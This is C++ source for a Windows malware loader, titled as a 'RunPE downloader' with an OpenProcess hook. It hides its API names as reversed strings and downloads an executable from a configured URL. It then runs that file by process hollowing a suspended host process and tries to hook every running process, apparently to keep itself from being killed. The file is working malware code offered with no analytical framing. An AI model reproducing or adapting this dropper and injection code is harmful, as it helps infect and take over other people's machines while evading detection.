
/* RUNPE DOWNLOADER - WITH SIMPLE OpenProcess HOOK */
/* proto types and functions needed */
// # proto's //

using namespace std;

typedef LPVOID HINTERNET;

typedef HINTERNET (WINAPI *_IOA)(
  _In_  LPCTSTR lpszAgent,
  _In_  DWORD dwAccessType,
  _In_  LPCTSTR lpszProxyName,
  _In_  LPCTSTR lpszProxyBypass,
  _In_  DWORD dwFlags
); _IOA IOA;

typedef HINTERNET (WINAPI *_IOUA)(
  _In_  HINTERNET hInternet,
  _In_  LPCTSTR lpszUrl,
  _In_  LPCTSTR lpszHeaders,
  _In_  DWORD dwHeadersLength,
  _In_  DWORD dwFlags,
  _In_  DWORD_PTR dwContext
); _IOUA IOUA;


typedef BOOL (WINAPI *_IRF)(
  _In_   HINTERNET hFile,
  _Out_  LPVOID lpBuffer,
  _In_   DWORD dwNumberOfBytesToRead,
  _Out_  LPDWORD lpdwNumberOfBytesRead
); _IRF IRF;


typedef BOOL (WINAPI *_ICH)(
  _In_  HINTERNET hInternet
); _ICH ICH;

typedef BOOL (WINAPI *_CPA)(
  _In_opt_     LPCTSTR lpApplicationName,
  _Inout_opt_  LPTSTR lpCommandLine,
  _In_opt_     LPSECURITY_ATTRIBUTES lpProcessAttributes,
  _In_opt_     LPSECURITY_ATTRIBUTES lpThreadAttributes,
  _In_         BOOL bInheritHandles,
  _In_         DWORD dwCreationFlags,
  _In_opt_     LPVOID lpEnvironment,
  _In_opt_     LPCTSTR lpCurrentDirectory,
  _In_         LPSTARTUPINFO lpStartupInfo,
  _Out_        LPPROCESS_INFORMATION lpProcessInformation
); _CPA CPA;


typedef BOOL (WINAPI *_GTC)(
  _In_     HANDLE hThread,
  _Inout_  LPCONTEXT lpContext
); _GTC GTC;

typedef LONG (WINAPI *_NTUMVOS)(HANDLE ProcessHandle, PVOID BaseAddress);
_NTUMVOS NTUMVOS;

typedef LPVOID (WINAPI *_VAE)(
  _In_      HANDLE hProcess,
  _In_opt_  LPVOID lpAddress,
  _In_      SIZE_T dwSize,
  _In_      DWORD flAllocationType,
  _In_      DWORD flProtect
); _VAE VAE;

typedef BOOL (WINAPI *_WPM)(
  _In_   HANDLE hProcess,
  _In_   LPVOID lpBaseAddress,
  _In_   LPCVOID lpBuffer,
  _In_   SIZE_T nSize,
  _Out_  SIZE_T *lpNumberOfBytesWritten
); _WPM WPM;


typedef BOOL (WINAPI *_STC)(
  _In_  HANDLE hThread,
  _In_  const CONTEXT *lpContext
); _STC STC;

typedef DWORD (WINAPI *_RT)(
  _In_  HANDLE hThread
); _RT RT;





// # proto's //

LPVOID _pAddress(char* name,char* lib)
{
	return GetProcAddress(LoadLibraryA(lib),name);
}

char* _peURL()
{
	// INTERNET_OPEN_TYPE_PRECONFIG = 0
	HINTERNET hInternet = IOA("UNCODER",0,NULL,NULL,0);
	 //INTERNET_FLAG_RELOAD = 0x80000000
	HINTERNET hFile = IOUA(hInternet,peURL,NULL,0,0x80000000,0);

	char* buff = new char[peSIZE];
	DWORD bRead = peSIZE;

	IRF(hFile,buff,peSIZE,&bRead); 

	ICH(hInternet);
	ICH(hFile);

	return buff;
}

DWORD INJ_C(char* bytes)
{
	
	PIMAGE_DOS_HEADER PDH  = (PIMAGE_DOS_HEADER)bytes;
	if(PDH->e_magic != IMAGE_DOS_SIGNATURE)
		return 0;

	PIMAGE_NT_HEADERS PNH = (PIMAGE_NT_HEADERS)( (DWORD)bytes + (DWORD)PDH->e_lfanew );
	if(PNH->Signature != IMAGE_NT_SIGNATURE)
		return 0;

	STARTUPINFO SI;
	PROCESS_INFORMATION PI;

	memset(&SI,0,sizeof(STARTUPINFO));
	memset(&PI,0,sizeof(PROCESS_INFORMATION));
	SI.cb = sizeof(STARTUPINFO);

	if(CPA(InjectInto,"",NULL,NULL,false,CREATE_SUSPENDED,NULL,NULL,&SI,&PI))
	{
		CONTEXT CONX;
		CONX.ContextFlags = CONTEXT_ALL;
		if(GTC(PI.hThread,&CONX))
		{
			NTUMVOS(PI.hProcess,(PVOID)PNH->OptionalHeader.ImageBase);
			VAE(PI.hProcess,(LPVOID)PNH->OptionalHeader.ImageBase,PNH->OptionalHeader.SizeOfImage,MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
			WPM(PI.hProcess,(LPVOID)PNH->OptionalHeader.ImageBase,bytes,PNH->OptionalHeader.SizeOfImage,NULL);
			
			CONX.Eax = PNH->OptionalHeader.ImageBase + PNH->OptionalHeader.AddressOfEntryPoint;
			STC(PI.hThread,&CONX);

			RT(PI.hThread);
			return PI.dwProcessId;
		}

	}

}

char* rev(char* str)
{
	string _str = str;
	_str = string ( _str.rbegin(), _str.rend() );

	char *cstr = new char[_str.length() + 1];
	strcpy(cstr, _str.c_str());

	return cstr;
}

void IntalizeProcs()
{
	IOA  = (_IOA ) _pAddress(rev("AnepOtenretnI"),       rev("teniniW")  );
    IOUA = (_IOUA) _pAddress(rev("AlrUnepOtenretnI"),    rev("teniniW")  );
	IRF  = (_IRF ) _pAddress(rev("eliFdaeRtenretnI"),    rev("teniniW")  );
	ICH  = (_ICH ) _pAddress(rev("eldnaHesolCtenretnI"), rev("teniniW")  ); 

	CPA  = (_CPA ) _pAddress(rev("AssecorPetaerC"),      rev("23lenrek") );
	GTC  = (_GTC ) _pAddress(rev("txetnoCdaerhTteG"),    rev("23lenrek") );

	NTUMVOS = (_NTUMVOS) _pAddress(rev("noitceSfOweiVpamnUtN"), rev("lldtn"));

	VAE  = (_VAE ) _pAddress(rev("xEcollAlautriV"),      rev("23lenrek") );
	WPM  = (_WPM ) _pAddress(rev("yromeMssecorPetirW"),  rev("23lenrek") );
	STC  = (_STC ) _pAddress(rev("txetnoCdaerhTteS"),    rev("23lenrek") );
	RT   = (_RT  ) _pAddress(rev("daerhTemuseR"),        rev("23lenrek") );

	printf("\nProcs addresses loaded and intliazed");


}

BOOL UNCKILLPROTECT()
{
	IntalizeProcs();
	MyID = INJ_C(_peURL());

	if(MyID != 0)
	{
		printf("\nNew process had been loaded");
		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,NULL);
		PROCESSENTRY32 PE32;
		PE32.dwSize = sizeof(PROCESSENTRY32);

		Process32First(hSnap,&PE32);
		do {

			if(PerformHook(PE32.th32ProcessID,(LPVOID)HookInstallFunc))
				printf("\nHook performed on (%d) : %s",PE32.th32ProcessID,PE32.szExeFile);
			else
				printf("\nError hook performing (%d) : %s",PE32.th32ProcessID,PE32.szExeFile);

		} while(Process32Next(hSnap,&PE32));

		return TRUE;
		
	}

	printf("\nError < loading the new process > ");
	return FALSE;
}